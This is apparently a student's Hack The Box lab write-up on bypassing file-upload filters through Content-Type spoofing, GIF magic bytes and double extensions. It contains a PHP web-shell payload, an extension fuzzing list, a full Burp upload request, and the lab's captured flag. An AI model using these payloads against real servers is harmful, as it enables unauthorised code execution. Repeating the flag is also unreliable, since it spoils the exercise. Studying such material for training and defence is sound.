
So far, we have only been dealing with type filters that only consider the file extension in the file name. However, as we saw in the previous section, we may still be able to gain control over the back-end server even with image extensions (e.g. shell.php.jpg). Furthermore, we may utilize some allowed extensions (e.g., SVG) to perform other attacks. All of this indicates that only testing the file extension is not enough to prevent file upload attacks.

This is why many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type. While extension filters may accept several extensions, content filters usually specify a single category (e.g., images, videos, documents), which is why they do not typically use blacklists or whitelists. This is because web servers provide functions to check for the file content type, and it usually falls under a specific category.

There are two common methods for validating the file content: Content-Type Header or File Content. Let's see how we can identify each filter and how to bypass both of them.

Content-Type
Let's start the exercise at the end of this section and attempt to upload a PHP script:

We see that we get a message saying Only images are allowed. The error message persists, and our file fails to upload even if we try some of the tricks we learned in the previous sections. If we change the file name to shell.jpg.phtml or shell.php.jpg, or even if we use shell.jpg with a web shell content, our upload will fail. As the file extension does not affect the error message, the web application must be testing the file content for type validation. As mentioned earlier, this can be either in the Content-Type Header or the File Content.

The following is an example of how a PHP web application tests the Content-Type header to validate the file type:

$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}

The code sets the ($type) variable from the uploaded file's Content-Type header. Our browsers automatically set the Content-Type header when selecting a file through the file selector dialog, usually derived from the file extension. However, since our browsers set this, this operation is a client-side operation, and we can manipulate it to change the perceived file type and potentially bypass the type filter.

We may start by fuzzing the Content-Type header with SecLists' Content-Type Wordlist through Burp Intruder, to see which types are allowed. However, the message tells us that only images are allowed, so we can limit our scan to image types, which reduces the wordlist to 45 types only (compared to around 700 originally). We can do so as follows:

SYNTAX: 
MJBUCKNER@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
MJBUCKNER@htb[/htb]$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt

For the sake of simplicity, let's just pick an image type (e.g. image/jpg), then intercept our upload request and change the Content-Type header to it:

we change the Content-Type: image/jpg  -> this allows us to bypass system and uplaod a .php file disguised

CHALLENGE: 83.136.249.46:44892 

Question 1 - The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
1) upload any normal picture to intercept the request sent using Burp Suite and send it to Repeater, so that they can know what type of filters are in place:
2)  keep the current value of the Content-Type header or change it to image/gif. However, for the file content, we need to make it as GIF8, thus making its signature as a GIF image:
Content-Disposition: form-data; name="uploadFile"; filename="Untitled.jpeg"
Content-Type: image/gif

GIF8
<?php system('cat /flag.txt'); ?>
-----------------------------141035040710475164731554234062--

2.B) add the <?php system('cat /flag.txt'); ?>    - line as shown above 
3) hit send and we see that file was uploaded sucessfully so we got past the content-type filters now time for whitelist and blacklist file extensions 
4) send to intruder and put the testing brackets around .jpeg & disable url encode 
5) use this list:
.jpeg.php
.jpg.php
.png.php
.php
.php3
.php4
.php5
.php7
.php8
.pht
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg

6) After clicking on "Start Attack", students will not get useful hits, as only images get uploaded, and none of them can execute code. However, students will notice that there are few PHP extensions that do not get blocked by the blacklist filter, as they show a different response from "Extension not allowed", which is "Only images are allowed", such as the case with the with the .phar extension:
7)  use the double extension method, making the file name cat.jpg.phar in Repeater and sending the modified intercepted request:
8) change burp to use this for filename -> Untitled.jpeg.phar
so it will look like: 
POST /upload.php HTTP/1.1
Host: 83.136.249.46:44892
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://83.136.249.46:44892/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------141035040710475164731554234062
Content-Length: 274
Origin: http://83.136.249.46:44892
DNT: 1
Connection: keep-alive
Sec-GPC: 1
Priority: u=0

-----------------------------141035040710475164731554234062
Content-Disposition: form-data; name="uploadFile"; filename="Untitled.jpeg.phar"
Content-Type: image/gif

GIF8
<?php system('cat /flag.txt'); ?>
-----------------------------141035040710475164731554234062--

9) we hit send and see file upload successful 
10) curl -s http://83.136.249.46:44892/profile_images/Untitled.jpeg.phar
GIF8
HTB{m461c4l_c0n73n7_3xpl0174710n}
